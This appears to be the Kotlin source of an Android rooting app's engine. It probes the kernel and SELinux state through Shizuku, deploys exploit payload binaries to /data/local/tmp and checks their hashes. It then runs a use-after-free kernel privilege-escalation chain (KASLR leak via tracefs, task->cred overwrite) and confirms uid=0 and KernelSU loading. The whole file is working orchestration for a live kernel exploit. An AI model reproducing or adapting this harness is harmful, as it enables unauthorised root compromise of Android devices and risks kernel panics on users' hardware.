package com.extractkit.app

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

data class Env(
    val model: String,
    val device: String,
    val androidRelease: String,
    val kernel: String,
    val selinux: String,
    val uidLine: String,
    val tracefs: Boolean,
    val rawTrace: Boolean,
    val trigger: Boolean,
    val cpus: Int,
    val kernelsu: Boolean,
    val suPath: String,
    val match: KernelTable.Match,
) {
    fun pretty(): String = buildString {
        appendLine("机型   $model / $device")
        appendLine("系统   Android $androidRelease")
        appendLine("内核   ${kernel.substringBefore("-abogki")}")
        appendLine("匹配   ${match.level} · ${match.reason}")
        appendLine("SELinux $selinux")
        appendLine("身份   $uidLine")
        appendLine("CPU    $cpus")
        appendLine("tracefs trace=${yn(tracefs)} raw=${yn(rawTrace)} trigger=${yn(trigger)}")
        appendLine("KSU    ${if (kernelsu) "已加载" else "未加载"}   su=${suPath.ifEmpty { "无" }}")
    }

    private fun yn(b: Boolean) = if (b) "可用" else "不可用"
}

data class Outcome(
    val ok: Boolean,
    val stage: String,
    val detail: String,
    val env: Env? = null,
    val verify: List<String> = emptyList(),
)

class ExtractEngine(
    private val ctx: Context,
    private val log: (String) -> Unit,
    private val onStage: (String) -> Unit,
) {

    companion object {
        const val WORK_DIR = "/data/local/tmp/extract-kit"
        private const val EOF = "\u0000__EOF__"
    }

    // ---------------------------------------------------------------- 连接层

    suspend fun ensureShell(): Boolean = withContext(Dispatchers.IO) {
        if (Shell.connected()) return@withContext true
        onStage("连接 Shizuku UserService")
        val ok = Shell.connect(ctx)
        if (!ok) log("! shell 连接失败：${Shell.error() ?: "未知原因"}")
        ok
    }

    // ---------------------------------------------------------------- 环境探测

    /**
     * 一次性把环境探完：11 条命令合并成 1 次 shell 往返。
     * 原来每条都走一次 binder + fork sh，冷启动要多花 0.5~1.5 秒。
     */
    suspend fun probe(): Env = withContext(Dispatchers.IO) {
        val script = buildString {
            append("echo M=$(getprop ro.product.model); ")
            append("echo D=$(getprop ro.product.device); ")
            append("echo A=$(getprop ro.build.version.release); ")
            append("echo K=$(uname -r); ")
            append("echo S=$(getenforce); ")
            append("echo U=$(id); ")
            append("echo T=$([ -w /sys/kernel/tracing/trace ] && echo 1 || echo 0); ")
            append("echo R=$([ -r /sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw ] && echo 1 || echo 0); ")
            append("echo G=$([ -w /sys/kernel/tracing/events/kmem/rss_stat/trigger ] && echo 1 || echo 0); ")
            append("echo C=$(grep -c ^processor /proc/cpuinfo); ")
            append("echo KS=$(grep -c kernelsu /proc/modules 2>/dev/null); ")
            append("echo SU=$(command -v su)")
        }
        val kv = Shell.exec(script).second.lineSequence()
            .mapNotNull { line ->
                val i = line.indexOf('=')
                if (i <= 0) null else line.substring(0, i).trim() to line.substring(i + 1).trim()
            }
            .toMap()

        fun v(k: String) = kv[k].orEmpty()
        val kernel = v("K")
        Env(
            model = v("M"),
            device = v("D"),
            androidRelease = v("A"),
            kernel = kernel,
            selinux = v("S").ifEmpty { "?" },
            uidLine = shortId(v("U")),
            tracefs = v("T") == "1",
            rawTrace = v("R") == "1",
            trigger = v("G") == "1",
            cpus = v("C").toIntOrNull() ?: 0,
            kernelsu = v("KS").toIntOrNull()?.let { it > 0 } ?: false,
            suPath = v("SU"),
            match = KernelTable.match(kernel),
        )
    }

    private fun one(cmd: String): String = Shell.exec(cmd).second.trim()

    /** `id` 输出里的 groups 又长又没用，只留 uid/gid 和 SELinux 上下文 */
    private fun shortId(raw: String): String {
        if (raw.isBlank()) return "?"
        val uid = Regex("""uid=(\d+\([^)]*\))""").find(raw)?.groupValues?.get(1) ?: "?"
        val gid = Regex("""gid=(\d+\([^)]*\))""").find(raw)?.groupValues?.get(1) ?: "?"
        val ctx = Regex("""context=(\S+)""").find(raw)?.groupValues?.get(1) ?: "?"
        return "uid=$uid gid=$gid\n         context=$ctx"
    }

    private fun ok(cmd: String): Boolean = Shell.exec(cmd).first == 0

    // ------------------------------------------------------------------ 部署

    suspend fun deploy(payloads: List<Payload>): Boolean = withContext(Dispatchers.IO) {
        var allOk = true
        log("准备目录 $WORK_DIR")
        Shell.exec("mkdir -p $WORK_DIR 2>&1")
        for (p in payloads) {
            val bytes = runCatching { ctx.assets.open(p.asset).use { it.readBytes() } }.getOrNull()
            if (bytes == null) {
                log("! 读取 assets/${p.asset} 失败")
                allOk = false
                continue
            }
            val path = "$WORK_DIR/${p.name}"
            val remote = Shell.exec("sha256sum $path 2>/dev/null").second.trim().substringBefore(' ')
            if (remote.equals(p.sha256, ignoreCase = true)) {
                log("· ${p.name} 已是最新（sha256 一致），跳过推送")
                continue
            }
            log("部署 ${p.name}  (${bytes.size} B) → $path")
            // 上一轮跑起来的 payload 还在驻留（PARKED），它的 inode 正在被执行，
            // Linux 会拒绝对这个路径 open(O_TRUNC)（ETXTBSY）。先写 .new 再 rename，
            // rename 只换目录项，不影响正在执行的那个 inode。
            val staged = "$path.new"
            var (code, out) = Shell.pushFile(staged, bytes)
            if (code == 0) {
                val mv = Shell.exec("mv -f $staged $path 2>&1")
                code = mv.first
                out = mv.second
                Shell.exec("chmod 755 $path 2>/dev/null")
            }
            if (code != 0) {
                log("! push 失败 exit=$code ${out.trim()}")
                allOk = false
                continue
            }
            val sha = Shell.exec("sha256sum $path 2>/dev/null").second.trim().substringBefore(' ')
            if (sha.length == 64) {
                if (sha.equals(p.sha256, ignoreCase = true)) {
                    log("✓ sha256 校验通过")
                } else {
                    log("! sha256 不匹配\n    期望 ${p.sha256}\n    实际 $sha")
                    allOk = false
                }
            } else {
                log("· 设备上没有 sha256sum，跳过校验")
            }
        }

        // device.cfg：本机标定过的优先，其次用内置 profile（同内核设备开箱即用）
        val cfgBytes = ConfigGen.cfgBytesForCurrentKernel(ctx)
        val target = "$WORK_DIR/device.cfg"
        if (cfgBytes != null) {
            val (code, out) = Shell.pushFile(target, cfgBytes, executable = false)
            val src = if (ConfigGen.profileFor(System.getProperty("os.version")) != null) "内置 profile" else "本机标定"
            if (code == 0) log("✓ 已下发 device.cfg（${cfgBytes.size} B，来源：$src）")
            else log("! device.cfg 下发失败：${out.trim()}")
        } else {
            log("· 没有匹配的 device.cfg，payload 用编译期默认常量")
        }
        allOk
    }

    // ------------------------------------------------------------------ 主流程

    /**
     * 单步模式直接跑；steps 非空时按顺序串起来，任一步不通过就中止 ——
     * 这样"自检不过还硬上主链"这种事不会发生。
     */
    suspend fun run(
        mode: Mode,
        allowUnmatched: Boolean,
        onStageUpdate: (String) -> Unit = onStage,
        managerPkg: String? = null,
        safeMode: Boolean = false,
    ): Outcome = withContext(Dispatchers.IO) {
        if (mode.steps.isEmpty()) {
            return@withContext runSingle(mode, allowUnmatched, onStageUpdate, managerPkg, safeMode)
        }
        // 同一次开机只允许成功一次：UAF 是一次性资源，成功后再跑等于对已释放的槽位再写一遍。
        // 用内核自己给的 boot_id 判断，而不是我们的时间戳——重启后 boot_id 一定会变。
        val bootId = if (ensureShell()) {
            Shell.exec("cat /proc/sys/kernel/random/boot_id 2>/dev/null").second.trim()
        } else ""
        val prefs = ctx.getSharedPreferences("run", android.content.Context.MODE_PRIVATE)
        val lastOkBoot = prefs.getString("last_ok_boot", null)
        if (bootId.isNotEmpty() && bootId == lastOkBoot) {
            log("[guard] 本次开机（boot_id=${bootId.take(8)}）已经成功过一次，拒绝重复执行")
            return@withContext Outcome(
                false, "SAME_BOOT",
                "本次开机已经提权成功过一次。\n" +
                    "同一颗内核只能安全地跑一次漏洞利用（第二次会写已经释放的对象）。\n" +
                    "重启后再跑；重启后 KernelSU / 管理器会重新加载。",
            )
        }
        log("[guard] boot_id=${bootId.take(8).ifEmpty { "?" }} lastOk=${lastOkBoot?.take(8) ?: "无"}")

        val total = mode.steps.size
        var last: Outcome? = null
        for ((index, id) in mode.steps.withIndex()) {
            val step = Modes.byId(id)
            onStageUpdate("[${index + 1}/$total] ${step.label}")
            log("======== 步骤 ${index + 1}/$total：${step.label} ========")
            val out = runSingle(step, allowUnmatched, onStageUpdate, managerPkg, safeMode)
            last = out
            if (!out.ok) {
                log("! 步骤 ${index + 1} 未通过（${out.stage}），中止后续步骤")
                return@withContext out.copy(
                    stage = "CHAIN_STOP:${step.id}",
                    detail = out.detail + "\n链在第 ${index + 1}/$total 步中止（${step.label}）",
                )
            }
        }
        val done = last ?: Outcome(false, "CHAIN", "空链")
        if (done.ok && bootId.isNotEmpty()) {
            prefs.edit().putString("last_ok_boot", bootId).apply()
            log("[guard] 记录本次开机已成功（boot_id=${bootId.take(8)}）")
        }
        done
    }

    private suspend fun runSingle(
        mode: Mode,
        allowUnmatched: Boolean,
        onStageUpdate: (String) -> Unit = onStage,
        managerPkg: String? = null,
        safeMode: Boolean = false,
    ): Outcome = withContext(Dispatchers.IO) {
        // 管理器包名：payload 用它决定 ksud late-load --package-name。
        // 传不进去就会退回编译期默认（com.sukisu.ultra），选别的管理器会「提权成功但没接管」。
        val mgrSafe = RunEnv.sanitizePkg(managerPkg)
        onStageUpdate("连接 shell")
        if (!ensureShell()) {
            return@withContext Outcome(
                false, "NO_SHELL",
                "拿不到 shell 上下文：${Shell.error() ?: "Shizuku 未运行/未授权"}。\n" +
                    "先在设备上启动 Shizuku 并给本应用授权。",
            )
        }

        onStageUpdate("环境检测")
        val env = probe()
        log("[env] ${env.kernel} / ${env.match.level} / SELinux=${env.selinux}")

        // 注意：判断「能不能跑」只看有没有对得上这台内核的 device.cfg（内置 profile / 本机标定 / 导入的
        // device.cfg 都算），不能只看内置列表——否则自己标定完的内核会被 ENV_UNMATCHED 挡住。
        log("[cfg] " + ConfigGen.cfgDiagnosis(ctx))
        val hasCfg = ConfigGen.cfgBytesForCurrentKernel(ctx) != null
        // 唯一判据：这台内核有没有可用的 cfg。机型、内置列表档位（EXACT/FAMILY/UNKNOWN）
        // 都只用于展示，不再参与放行——避免「改了其中一个判断还是跑不通」。
        log("[cfg] gate=hasCfg hasCfg=$hasCfg level=${env.match.level} allow=$allowUnmatched")
        if (!hasCfg && !allowUnmatched) {
            return@withContext Outcome(
                false, "NO_CFG",
                """这台内核（${env.kernel}）没有可用的 device.cfg：
${ConfigGen.cfgDiagnosis(ctx)}
payload 只会用编译期常量（6.6.118 那套），在别的内核上跑不通。
去「标定」重新导入本机 boot.img（解析完会自动保存并下发 device.cfg）。""",
                env,
            )
        }
        if (!env.tracefs && mode.id != "preflight_98260") {
            return@withContext Outcome(
                false, "NO_TRACEFS",
                "tracefs 不可写：拿不到 k_itimer 地址与 KASLR slide，泄漏/回收阶段走不下去。",
                env,
            )
        }

        // 安全模式用 work 目录里的标记文件传给 ksu_stage.sh（env 会被 execve 清掉，文件最稳）
        val safeFlag = "$WORK_DIR/safe_mode"
        Shell.exec(if (safeMode) "mkdir -p $WORK_DIR && touch $safeFlag" else "rm -f $safeFlag")
        if (safeMode) log("· 安全模式：开（late-load 前临时禁用已有模块，成功后恢复）")

        // 5.10 代的 kmem 事件布局与 6.x 不同，用诊断版 payload 采集原始记录；
        // 其余内核继续用静态 payload（已知可在 6.x 上几秒内跑通）。
        // 一种内核分支一份 payload：按 uname -r 的版本前缀选，缺省回落到 mode.target。
        // 依据：那份 APK 的 assets/ 就是按分支分目录（98260-117 / 98260-6138 / 98260），
        // 每个目录一份 exploit-android-key-ptr，符号表再按管理器拆。
        // 第一优先：这一颗内核有专门编的 payload（常量按它编死，跑错会自拒）
        // 第二优先：按分支回落（5.10 的 kmem 布局与 6.x 不同）
        // 注意：不能直接 substringBefore('-')，否则 "5.10.252-android12-9-g…" 会得到
        // "5.10.252"（版本号是主.次.补丁三段），永远匹配不到 PER_FAMILY 的 "5.10"。
        // 这里取「主.次」两段，其余部分（补丁号/构建串）不参与匹配。
        val family = env.kernel.split('.').take(2).joinToString(".")
    // 9.18：5.x 用分支专用版；5.x 以外一律用 9.00 那份字面成功版（不重编）
    val pickedPayload = if (family.startsWith("5.") || family == "6.1") {
        Payloads.PER_FAMILY[family] ?: mode.target
    } else {
        mode.target
    }
        if (pickedPayload !== mode.target) {
            log("· payload：${pickedPayload.name}（内核分支 $family*）")
        } else {
            log("· payload：${pickedPayload.name}（分支 $family 无专用版，回落到通用版）")
        }

        onStageUpdate("部署 payload")
        if (!deploy((mode.allPayloads + pickedPayload).distinct())) {
            return@withContext Outcome(false, "DEPLOY", "payload 部署或校验失败，见日志。", env)
        }

        mode.selfCheckArgs?.let { args ->
            onStageUpdate("预检 ${pickedPayload.name} $args")
            log("---- 预检：${pickedPayload.name} $args ----")
            val pre = stream(
                cmd = RunEnv.command(WORK_DIR, pickedPayload.name, args, managerPkg),
                markers = listOf("READY", "PREFLIGHT_PASS"),
                timeoutSec = 150,
                persistOnSuccess = false,
                onStage = onStageUpdate,
            )
            if (pre.ok) {
                log("✓ 预检通过（${pre.marker}）")
            } else {
                log("! 预检未通过（${pre.reason}）——继续主链风险很高")
            }
        }

        log("· 管理器包名：${mgrSafe ?: "未选择（payload 用 com.sukisu.ultra）"}")
        onStageUpdate("执行 ${pickedPayload.name} ${mode.args.ifEmpty { "(默认)" }}")
        log("---- 主链：${pickedPayload.name} ${mode.args} ----")
        val res = stream(
            cmd = RunEnv.command(WORK_DIR, pickedPayload.name, mode.args, managerPkg),
            markers = mode.successMarkers,
            timeoutSec = mode.timeoutSec,
            persistOnSuccess = mode.persists,
            onStage = onStageUpdate,
        )
        when {
            res.ok && mode.persists ->
                log("✓ 命中成功标记（${res.marker}）。进程已驻留，请勿 kill —— 要清理只能重启设备。")
            res.ok -> log("✓ 命中成功标记（${res.marker}）")
            res.parked -> log("! 未拿到 root，payload 已驻留（${res.reason}）")
            res.timedOut -> log("! 超时（${mode.timeoutSec}s）未命中成功标记")
            else -> log("! 未命中成功标记（${res.reason}）")
        }

        onStageUpdate("校验结果")
        var verify = verify()
        // 成功只认 root（su -c id / id / kernelsu 已加载）。
        // 标记只说明 payload 自己认为跑完了，不能当证据 ——
        // 之前 marker="kernelsu" 被 "kernelsu →（无）" 命中，直接把失败报成成功。
        var rooted = isRooted(verify)
        var tries = 0
        while (!rooted && tries < 4) {
            kotlinx.coroutines.delay(700)
            verify = verify()
            rooted = isRooted(verify)
            tries++
        }
        verify.forEach { log("  $it") }
        if (res.ok && !rooted) log("! 命中标记但没有 root：判定为失败（标记不算证据）")

        val ok = if (mode.persists) rooted else res.ok
        Outcome(
            ok = ok,
            stage = when {
                ok -> "DONE"
                res.parked -> "PARKED"
                else -> "EXPLOIT"
            },
            detail = buildString {
                if (res.ok) appendLine("命中标记：${res.marker}" + if (rooted) "" else "（但没有 root，不算成功）")
                if (res.timedOut) appendLine("超时：${mode.timeoutSec}s")
                appendLine(if (rooted) "已确认 uid=0 / KernelSU 已加载" else "未确认 uid=0")
                if (mode.persists && res.ok) appendLine("注意：驻留进程不要 kill，清理只能重启。")
            },
            env = env,
            verify = verify,
        )
    }

    /**
     * 现在是否已经有 root（不是"能不能跑利用"，而是"su 是否已经可用"）。
     * 用于冷启动时把界面直接显示成"已提权"，而不是永远停在"就绪"。
     */
    suspend fun hasRootNow(): Boolean = withContext(Dispatchers.IO) {
        if (!Shell.connected() && !Shell.connect(ctx)) return@withContext false
        val (code, out) = Shell.exec("su -c id 2>&1")
        code == 0 && out.contains("uid=0")
    }

    /** KSU 模块是否真的加载了 —— 管理器能不能"接管"就看这个。 */
    suspend fun ksuModuleLoaded(): Boolean = withContext(Dispatchers.IO) {
        if (!Shell.connected() && !Shell.connect(ctx)) return@withContext true
        val (_, out) = Shell.exec("grep -c '^kernelsu ' /proc/modules 2>/dev/null")
        (out.trim().toIntOrNull() ?: 0) > 0
    }

    /** 把 ksud 子进程的输出捞回来（它不在 App 读的管道里，必须单独读）。 */
    suspend fun collectKsuStageLog(): String = withContext(Dispatchers.IO) {
        runCatching {
            val (code, out) = Shell.exec("cat /data/local/tmp/ksu_stage.out 2>/dev/null")
            if (code == 0) out.trim() else ""
        }.getOrDefault("")
    }

    /** 唯一判定标准：`su -c id` 真的返回 uid=0。模块在不在、标记命没命中都不算。 */
    private fun isRooted(verify: List<String>): Boolean =
        verify.firstOrNull { it.startsWith("su →") }?.contains("uid=0") == true

    suspend fun verify(): List<String> = withContext(Dispatchers.IO) {
        val ksu = Shell.exec("grep kernelsu /proc/modules 2>&1").second.trim()
        listOf(
            "id → " + shortId(Shell.exec("id").second.trim()).replace("\n", " "),
            "su → " + shortId(Shell.exec("su -c id 2>&1").second.trim()).replace("\n", " ")
                .ifEmpty { "(无输出)" },
            // /proc/modules 后半段是地址和标记，界面上没意义，只留模块名 + 大小
            "kernelsu → " + ksu.split(" ").take(3).joinToString(" ").ifEmpty { "(无)" },
            "getenforce → " + Shell.exec("getenforce 2>&1").second.trim(),
        )
    }

    // ------------------------------------------------------------ 流式执行核心

    private class StreamOutcome(
        val ok: Boolean,
        val marker: String?,
        val timedOut: Boolean,
        val reason: String,
        /** payload 主动“放弃写入并驻留”，此时绝不能 kill */
        val parked: Boolean = false,
        val fatal: Boolean = false,
    )

    /**
     * 起进程 → 实时回传输出 → 按成功标记判定。
     *
     * persistOnSuccess = true 时命中标记后**不结束进程**（也不关闭管道）：
     * 上游实现里那块 slab 页此刻承载着活着的 task->cred，进程退出会把页还回去，
     * 随后的 cleanup_timerqueue() 会在陈旧 rb_node 上操作并 panic。
     */
    private fun stream(
        cmd: String,
        markers: List<String>,
        timeoutSec: Long,
        persistOnSuccess: Boolean,
        onStage: (String) -> Unit = {},
    ): StreamOutcome {
        val session = Shell.stream(cmd)
            ?: return StreamOutcome(false, null, false, Shell.error() ?: "UserService 未连接")

        val queue = LinkedBlockingQueue<String>()
        Thread {
            try {
                session.input.bufferedReader().use { reader ->
                    var line = reader.readLine()
                    while (line != null) {
                        queue.put(line)
                        line = reader.readLine()
                    }
                }
            } catch (_: Throwable) {
                // 读端被关闭 / 进程被收掉，属于正常路径
            } finally {
                queue.put(EOF)
            }
        }.apply {
            isDaemon = true
            name = "extract-reader"
        }.start()

        val deadline = System.currentTimeMillis() + timeoutSec * 1000
        val mute = AtomicBoolean(false)
        var hit: String? = null
        var parked = false
        var fatal = false
        var timedOut = false
        var ended = false

        loop@ while (true) {
            val item = queue.poll(120, TimeUnit.MILLISECONDS)
            if (item == null) {
                if (System.currentTimeMillis() > deadline) {
                    timedOut = true
                    break@loop
                }
                continue
            }
            var current: String? = item
            while (current != null) {
                if (current == EOF) {
                    ended = true
                    break@loop
                }
                if (!mute.get()) log(current)

                // 日志 → 提权阶段；同时识别“放弃驻留”与内核异常。
                // 不放进 let：break@loop 在 inline lambda 里是实验特性，编译会报错
                val stageHit = StageMap.classify(current)
                if (stageHit != null) {
                    val stage = stageHit.stage
                    if (stage != null) onStage(StageMap.label(stage))
                    if (stageHit.fatal) {
                        log("!! 日志里出现内核异常特征（panic/oops），设备可能马上重启")
                        fatal = true
                        break@loop
                    }
                    if (stageHit.parked) {
                        parked = true
                        log("!! payload 已放弃写入并驻留（僵尸被按住）：不要 kill，清理只能重启设备")
                        break@loop
                    }
                }

                if (hit == null) {
                    for (m in markers) {
                        if (current.contains(m)) {
                            hit = m
                            break
                        }
                    }
                }
                if (hit != null && persistOnSuccess) {
                    mute.set(true)
                    break@loop
                }
                current = queue.poll()
            }
            if (System.currentTimeMillis() > deadline) {
                timedOut = true
                break@loop
            }
        }

        val exitCode = session.exitCodeOrNull()
        if ((hit != null && persistOnSuccess) || parked || fatal) {
            // 故意不 close：进程要留活着
        } else {
            session.close()
        }

        val reason = when {
            fatal -> "内核异常特征（panic/oops），设备可能重启"
            parked -> "parked：已放弃写入并驻留，需重启清理"
            timedOut -> "超时 ${timeoutSec}s"
            exitCode != null -> "exit=$exitCode"
            ended -> "输出结束"
            else -> "读取中断"
        }
        return StreamOutcome(hit != null, hit, timedOut, reason, parked, fatal)
    }
}
